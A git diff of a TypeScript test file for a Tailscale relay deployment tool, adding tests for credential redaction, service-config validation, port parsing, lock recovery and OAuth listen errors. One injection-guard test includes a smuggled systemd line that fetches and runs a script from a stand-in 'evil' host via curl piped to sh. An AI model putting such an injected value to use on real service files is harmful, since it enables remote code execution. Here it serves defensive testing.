@@ -1,6 +1,7 @@
-import { mkdtempSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { createServer } from "node:net";
 import { describe, expect, it, vi } from "vitest";
 import {
   ensureHuJsonKey,
@@ -10,6 +11,9 @@ import {
 import { maskEnv, validateServiceConfig } from "../src/service/config.js";
 import { redactArgv, sanitizeCommandText } from "../src/tailscale.js";
 import { loadConfigFile, resolveConfig } from "../src/core.js";
+import { redactEnv } from "../src/deploy.js";
+import { withDownloadLock } from "../src/binary.js";
+import { startOAuthWrapper } from "../src/oauth-wrapper.js";
 import { verifyEndpointReachable } from "../src/verify.js";
 import { isValidPort, parseRelayMapping } from "../src/relay.js";
 import { policySync } from "../src/policy.js";
@@ -58,7 +62,7 @@ describe("secret redaction", () => {
     );
   });
 
-  it("produces a child env with every credential removed", () => {
+  it("removes every credential variable from the child environment", () => {
     // Regression: the redacted copy used to be spread over process.env, which
     // resurrected every key it had just deleted.
     const source: NodeJS.ProcessEnv = {
@@ -73,23 +77,18 @@ describe("secret redaction", () => {
       TS_API_TRUST: "tskey-client-a-b",
       TAILSCALE_TRUST_CREDENTIAL: "tskey-client-a-b",
       TAILSCALE_API_TRUST: "tskey-client-a-b",
+      TS_TAILSCALE_SOCKET: "/tmp/tailscaled.sock",
     };
-    const copy = { ...source };
-    for (const name of [
-      "TS_API_KEY",
-      "TS_ACCESS_TOKEN",
-      "TS_API_TOKEN",
-      "TS_CLIENT_SECRET",
-      "TS_OAUTH_CLIENT_SECRET",
-      "TS_AUTH_KEY",
-      "TS_TRUST_CREDENTIAL",
-      "TS_API_TRUST",
-      "TAILSCALE_TRUST_CREDENTIAL",
-      "TAILSCALE_API_TRUST",
-    ]) {
-      delete copy[name];
-    }
-    expect(Object.keys({ ...copy }).sort()).toEqual(["PATH"]);
+    const redacted = redactEnv(source);
+    expect(Object.keys(redacted).sort()).toEqual([
+      "PATH",
+      "TS_TAILSCALE_SOCKET",
+    ]);
+    // The child env is used as-is, never merged over process.env, so this
+    // copy is the whole environment the subprocess sees.
+    expect(JSON.stringify(redacted)).not.toContain("SECRET");
+    // redactEnv must not mutate its input.
+    expect(source.TS_AUTH_KEY).toBe("tskey-auth-SECRET");
   });
 });
 
@@ -122,6 +121,33 @@ describe("service config injection guards", () => {
         dir,
       ),
     ).toThrow(/SERVICE_FIELD_INVALID/);
+  });
+
+  it("rejects a newline in description (systemd Description= injection)", () => {
+    expect(() =>
+      validateServiceConfig(
+        {
+          name: "x",
+          description: "relay\nExecStartPre=/bin/sh -c 'curl evil|sh'",
+          workingDir: dir,
+          args: [],
+        } as never,
+        dir,
+      ),
+    ).toThrow(/SERVICE_FIELD_INVALID/);
+  });
+
+  it("keeps ordinary descriptions (including quotes) valid", () => {
+    const parsed = validateServiceConfig(
+      {
+        name: "x",
+        description: 'Tailscale relay — the "primary" db',
+        workingDir: dir,
+        args: [],
+      } as never,
+      dir,
+    );
+    expect(parsed.description).toBe('Tailscale relay — the "primary" db');
   });
 
   it("rejects a newline in args", () => {
@@ -280,6 +306,13 @@ describe("config file parsing", () => {
     );
     expect(resolveConfig({ TS_PROFILE: "ci" }).profile).toBe("ci");
   });
+
+  it("does not accept inherited Object keys as profiles", () => {
+    for (const bogus of ["toString", "constructor", "__proto__"])
+      expect(() => resolveConfig({ TS_PROFILE: bogus })).toThrow(
+        /PROFILE_INVALID/,
+      );
+  });
 });
 
 describe("verify timeout validation", () => {
@@ -310,8 +343,71 @@ describe("relay port validation", () => {
     expect(isValidPort(Number.NaN)).toBe(false);
   });
 
+  it("rejects unusable ports from --map, not only from config files", () => {
+    // These used to reach server.listen()/net.connect() as an opaque EINVAL.
+    expect(() => parseRelayMapping("8080.5:5432")).toThrow(/RELAY_MAP_INVALID/);
+    expect(() => parseRelayMapping("[::1]:8080.5:5432")).toThrow(
+      /RELAY_MAP_INVALID/,
+    );
+    expect(() => parseRelayMapping("0:5432")).toThrow(/RELAY_MAP_INVALID/);
+    expect(parseRelayMapping("5432:15433").listenPort).toBe(5432);
+  });
+
   it("leaves listenHost undefined so the caller can apply --host", () => {
     expect(parseRelayMapping("5432:15433").listenHost).toBeUndefined();
+  });
+});
+
+describe("download lock recovery", () => {
+  it("breaks a lock left behind by a dead process", async () => {
+    // A crashed downloader must not block provisioning forever.
+    const dir = tmp();
+    const previous = process.env.TS_BIN_DIR;
+    process.env.TS_BIN_DIR = dir;
+    try {
+      mkdirSync(dir, { recursive: true });
+      // 0x7FFFFFFF is not a live pid on Linux; keep it plausible for the
+      // pidAlive() probe.
+      writeFileSync(join(dir, ".download.lock"), "2147483647\nlinux-tgz");
+      const result = await withDownloadLock("test", async () => "acquired");
+      expect(result).toBe("acquired");
+    } finally {
+      if (previous === undefined) delete process.env.TS_BIN_DIR;
+      else process.env.TS_BIN_DIR = previous;
+    }
+  });
+});
+
+describe("oauth wrapper listen failures", () => {
+  it("reports EADDRINUSE instead of crashing the process", async () => {
+    const blocker = createServer();
+    await new Promise<void>((resolvePromise) => {
+      blocker.listen(0, "127.0.0.1", () => resolvePromise());
+    });
+    const address = blocker.address();
+    if (address === null || typeof address === "string") {
+      await new Promise<void>((resolvePromise) =>
+        blocker.close(() => resolvePromise()),
+      );
+      throw new Error("could not determine a port to test with");
+    }
+    const errors: string[] = [];
+    const logged = vi.spyOn(console, "error").mockImplementation(() => {});
+    const server = startOAuthWrapper({
+      port: address.port,
+      token: "t",
+      onError: (message) => errors.push(message),
+    });
+    try {
+      await vi.waitFor(() => expect(errors.length).toBeGreaterThan(0));
+      expect(errors[0]).toMatch(/^OAUTH_(PORT_IN_USE|LISTEN_FAILED)/);
+    } finally {
+      logged.mockRestore();
+      server.close();
+      await new Promise<void>((resolvePromise) =>
+        blocker.close(() => resolvePromise()),
+      );
+    }
   });
 });
 
